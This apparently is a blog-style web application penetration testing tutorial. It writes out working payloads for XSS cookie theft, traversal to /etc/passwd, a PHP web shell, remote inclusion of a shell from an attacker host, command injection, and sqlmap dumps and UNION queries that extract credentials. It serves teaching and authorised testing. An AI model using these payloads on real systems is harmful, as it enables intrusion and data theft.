---
layout: post
title: "Common Web Application Attacks"
date: 2024-11-01
categories: Web-App
---

# Web Application Penetration Testing Guide

## Table of Contents

1. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
2. [Directory Traversal](#directory-traversal)
   - Absolute vs Relative Paths
   - Identifying and Exploiting Directory Traversals
   - Encoding Special Characters
3. [File Inclusion Vulnerabilities](#file-inclusion-vulnerabilities)
   - Local File Inclusion (LFI)
   - PHP Wrappers
   - Remote File Inclusion (RFI)
4. [File Upload Vulnerabilities](#file-upload-vulnerabilities)
   - Using Executable Files
   - Using Non-Executable Files
5. [OS Command Injection](#os-command-injection)
6. [SQL Injection](#sql-injection)
7. [Disclaimer](#disclaimer)

---

## Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) allows attackers to inject JavaScript into a web page that executes in other users' browsers.

### Types of XSS

- **Reflected XSS**: Injected code is reflected off a web server, immediately executing in the user’s browser.
- **Stored XSS**: Injected code is stored on the server, making it available to multiple users.
- **DOM-Based XSS**: Exploits a vulnerability in the page's client-side JavaScript.

### Using Burp Suite to Inject XSS Payloads

1. **Set up Burp Proxy**:
   - Configure your browser to route traffic through **Burp Suite’s Proxy** (usually `127.0.0.1:8080`).

2. **Intercept Requests**:
   - Navigate to a form input or URL parameter on the target website where user input is accepted.
   - **Example URL**: `http://example.com/search?q=`
   - Enter a sample query like `<script>alert(1)</script>` to test for XSS.

3. **Modify Payload in Burp Suite**:
   - Intercept the request in Burp Proxy and **send it to Burp Repeater**.
   - In **Repeater**, replace the value of `q` with an XSS payload, like `<script>alert(document.cookie)</script>`.
   - **Send** the modified request and observe if the JavaScript executes.

### Advanced XSS Payloads

- **Obfuscate with String.fromCharCode() to bypass filters**:

  ```javascript
  <script>String.fromCharCode(97, 108, 101, 114, 116)(1);</script>
  ```

- **Use HTML encoding for `<script>`**:

  ```html
  <img src="x" onerror="alert('XSS')">
  ```

---

## Directory Traversal

Directory traversal vulnerabilities allow attackers to access files outside the intended directory structure by manipulating file paths.

### Absolute vs Relative Paths

- **Absolute Path**: Full file path from the root (e.g., `/var/www/html/config.php`).
- **Relative Path**: Path relative to the current directory (e.g., `../../../../etc/passwd`).

### Identifying and Exploiting Directory Traversals

1. **Basic Payload**: Try `../` sequences to navigate up directories (e.g., `../../../etc/passwd`).
  
2. **Adding Padding to Traversal Strings**:
   - For cases where traversal is limited by the application or file system, add excess `../` sequences to ensure you reach the root directory. For instance:

     ```
     ../../../../../../../../../../etc/passwd
     ```

     Once the root is reached, additional `../` sequences remain in the root, allowing access to files from the root directory without additional navigation.

3. **Using Gobuster to Enumerate Directories**:
   - **Identify Possible Entry Points**:
     - Look for URL parameters with file paths, such as `http://example.com/view?file=`.

   - **Run Gobuster to Brute-Force Directories**:
     - Use Gobuster to find hidden directories and files.
     - Example command:

       ```bash
       gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt -x php,html
       ```

     - This command uses a common directory wordlist and checks for extensions like `.php` and `.html`.

   - **Analyze Results**:
     - Identify paths like `/admin`, `/config`, or `/includes` that may access sensitive files.

#### Testing Directory Traversal Exploits with Burp Suite

1. **Modify Path Parameters in Burp Repeater**:
   - Intercept a request with a file path parameter, such as `http://example.com/view?file=home.html`.
   - **Send to Burp Repeater** and replace `home.html` with traversal sequences like `../../../etc/passwd`.
   - Check if the server responds with content from sensitive files.

2. **Encoding Special Characters**:
   - URL encode traversal sequences to bypass filters, e.g., `%2e%2e%2f%2e%2e%2fetc/passwd`.

---

## File Inclusion Vulnerabilities

File inclusion vulnerabilities allow attackers to include files on the server through the web browser.

### Local File Inclusion (LFI)

1. **Identify File Inclusion Points**:
   - Look for parameters like `?file=` in URLs, e.g., `http://example.com/view?file=about.html`.

2. **Inject LFI Payloads Using Burp Suite**:
   - Intercept the request and **send it to Burp Repeater**.
   - Replace `about.html` with traversal payloads, such as `../../../../etc/passwd`.
   - Send the request to see if the server includes sensitive files.

### PHP Wrappers for LFI

1. **Use PHP Wrappers to Bypass Restrictions**:
   - Try including files encoded in base64:

     ```php
     php://filter/convert.base64-encode/resource=index.php
     ```

   - Intercept and send this in Repeater to receive a base64-encoded version of the file.

2. **Log Poisoning with LFI**:
   - Inject PHP code into logs (e.g., `<?php system($_GET['cmd']); ?>`).
   - Access the log file via the vulnerable parameter:

     ```url
     http://example.com/view?file=/var/log/apache2/access.log
     ```

### Remote File Inclusion (RFI)

1. **Inject Remote File URL**:
   - For vulnerable sites, try pointing the `file` parameter to a remote file:

     ```url
     http://example.com/view?file=http://attacker-site.com/shell.php
     ```

   - This could execute the remote file on the server.

---

## File Upload Vulnerabilities

File upload vulnerabilities occur when applications allow unvalidated file uploads.

### Using Executable Files

1. **Upload a Malicious PHP File**:
   - Prepare a simple PHP shell, such as:

     ```php
     <?php system($_GET['cmd']); ?>
     ```

   - Attempt to upload this file in a file upload form.

2. **Modify File Extension in Burp Suite**:
   - If the application restricts `.php` files, intercept the request in Burp, and try changing `.php` to `.php.jpg`.
   - After upload, access the file:

     ```url
     http://example.com/uploads/shell.php.jpg?cmd=ls
     ```

### Using Non-Executable Files

1. **Upload with Modified Headers**:
   - Change the `Content-Type` header in Burp Suite to bypass filtering.
   - For example, change `application/php` to `image/jpeg` to evade detection.

2. **Exploit Directory Traversal for File Execution**:
   - Upload a file as `.jpg` and access it through directory traversal combined with LFI.

---

## OS Command Injection

Command injection allows executing arbitrary commands on the server by injecting command operators.

### Testing OS Command Injection with Burp Suite

1. **Identify Parameters Susceptible to Injection**:
   - Look for parameters that interact with the system, such as those taking IP addresses.

2. **Modify Requests with OS Commands**:
   - Inject commands like `; whoami` or `| cat /etc/passwd` into the vulnerable parameter in Burp Repeater.
   - Example:

     ```url
     http://example.com/ping?ip=8.8.8.8;whoami
     ```

3. **Chaining Commands**:
   - Use `&&` to chain commands or redirect output, e.g., `http://example.com/ping?ip=8.8.8.8 && ls`.

---

## SQL Injection

SQL Injection (SQLi) vulnerabilities allow attackers to manipulate the SQL queries used by the application.

### SQL Injection Testing with SQLMap

1. **Run SQLMap for Automated Testing**:
   - Basic SQLMap command:

     ```bash
     sqlmap -u "http://example.com/item?id=1" --dbs
     ```

   - **Options**:
     - `--tables`: List tables in a specific database.
     - `--dump`: Dump data from a table.

2. **Bypass WAFs and Filters**:
   - Use tamper scripts in SQLMap, e.g., `sqlmap -u "http://example.com/item?id=1" --dbs --tamper=space2comment`.

3. **Manual SQLi with Burp Suite**:
   - Intercept a request in Burp Proxy,

 send it to Repeater, and try different payloads:
     - `' OR '1'='1`
     - `UNION SELECT null, username, password FROM users--`

4. **Blind SQL Injection**:
   - SQLMap can be configured for Boolean-based blind SQLi, e.g., `sqlmap -u "http://example.com/item?id=1" --level 5 --risk 3`.

---

## Disclaimer

This guide is intended for ethical penetration testing engagements where explicit permissions have been granted. Unauthorized testing without consent is illegal and unethical. Always follow applicable laws and regulations.
